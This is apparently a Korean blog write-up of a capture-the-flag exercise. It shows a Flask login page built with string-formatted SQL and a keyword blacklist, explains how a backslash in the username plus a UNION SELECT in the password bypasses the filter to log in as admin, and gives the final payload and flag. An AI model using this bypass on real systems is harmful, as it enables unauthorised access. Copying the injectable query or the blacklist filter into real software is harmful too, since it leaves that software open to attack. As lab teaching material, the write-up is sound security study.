---
title: "[Writeup] Knockon Bootcamp - 3.2 SQLi_WAF_2"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - SQL Injection
  - Filter Bypass
last_modified_at: 2024-08-28T23:00:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10031/>

![3.2 SQLi WAF 2 1](/assets/images/writeup/web-hacking/knock-on/3-2_SQLi_WAF_2_1.png)

![3.2 SQLi WAF 2 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)

![3.2 SQLi WAF 2 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)

|

|

|

### 목표

---

필터링 로직을 우회하여 admin 계정으로 로그인하기

|

### 공격 기법

---

SQL Injection

- Filter Bypass

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os
import string

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
LOGIN_FLAG = os.getenv("LOGIN_FLAG")
MYSQL_HOST = "db"

app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)


class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    query = None
    if request.method == "POST":
        filtering_list = ['or', 'and', '\'', '"']
        username = request.form["username"].lower()
        password = request.form["password"].lower()

        for filter in filtering_list :
            if (filter in username) or (filter in password):
                return render_template("login.html", error='no Hack!')

        query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
        
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
        if user and user[1] == "admin":
            return redirect(url_for("success", username=user[1], flag=LOGIN_FLAG))
        elif user:
            return redirect(url_for("success", username=user[1]))
        else:
            error = "Invalid Credentials"
        return render_template("login.html", error=error, query=str(query))
    else :
        return render_template("login.html")


@app.route("/success")
def success():
    username = request.args.get("username", "Unknown")
    flag = request.args.get("flag", "So.. what?")
    return render_template("success.html", username=username, flag=flag)


if __name__ == "__main__":
    db.create_all()
    app.run(debug=True, host="0.0.0.0", port=8080)
```

|

|

|

## 코드 분석

```python
filtering_list = ['or', 'and', '\'', '"']
username = request.form["username"].lower()
password = request.form["password"].lower()
```

or, and에 이어 `‘(따옴표)`가 금지 당함


|

|

|

## Exploit

```sql
SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
```

```sql
admin' -- 1
```

사용 불가

`‘`를 사용할 수 없기 때문에 기존의 공격 방식을 사용할 수 없음

|

```sql
SELECT * FROM user WHERE username = '\' AND password = '{password}'
```

`username`에 `\(백 슬래시)`를 사용하면 바로 뒤에 있는 `‘`가 문자로 인식됨

그래서 그 다음 `‘`까지, `'\' AND password ='` 가 문자열로 인식되고, 그 뒷부분인 `password` 부터 쿼리로 인식함

`password`부분에  **union**을 이용해 **admin**으로 로그인하는 새 쿼리를 작성해주면 됨 

|

```sql
union select 1,2,3 -- 1
```

![3.2 SQLi WAF 2 2](/assets/images/writeup/web-hacking/knock-on/3-2_SQLi_WAF_2_2.png)

`user 테이블`의 열 수가 3이므로 기본 형태는 이렇게 됨

|

```sql
union select 1,(select username from user limit 1,1),3 -- 1
```

`username`의 첫 번째 행은 guest이므로 두 번째 행인 **admin**으로 설정

|

|

|

## Payload

```
username: \

password: union select 1, (select username from user limit 1,1), 3 -- 1
```

|

|

### FLAG

---

```
K0{quote_is_important}
```

|

---